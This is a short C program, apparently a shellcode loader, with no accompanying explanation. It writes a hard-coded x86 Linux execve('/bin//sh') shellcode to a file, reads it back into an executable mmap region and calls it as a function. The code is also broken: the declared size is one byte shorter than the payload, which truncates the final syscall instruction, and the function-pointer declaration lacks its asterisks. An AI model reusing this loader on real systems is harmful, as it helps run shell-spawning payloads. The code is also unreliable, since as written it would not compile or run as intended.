#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

#define SHELLCODE_SIZE 22

void execute_shellcode(void);

int main(int argc, char **argv) 
{ 
    FILE *afile; 
    char str[400]; 
    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; 
    afile = fopen("afile", "w"); 
    fwrite("some data", sizeof(char), 10, afile); 
    fwrite(shellcode, sizeof(char), SHELLCODE_SIZE, afile); 
    fclose(afile); 
    execute_shellcode(); 
    printf("Returned properly\n"); 
 return 0; 
} 
void execute_shellcode(void) 
{ 
    char *buffer; 
    size_t size = SHELLCODE_SIZE; 
    buffer = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); 
        if (buffer == MAP_FAILED) { 
            perror("mmap"); 
            exit(1); 
        } 
    FILE *afile = fopen("afile", "r"); 
    fseek(afile, -SHELLCODE_SIZE, SEEK_END); 
    fread(buffer, sizeof(char), SHELLCODE_SIZE, afile); 
    fclose(afile); 
    void (shellcode_func)(void) = (void ()(void))buffer; 
    shellcode_func(); 
    munmap(buffer, size); 
}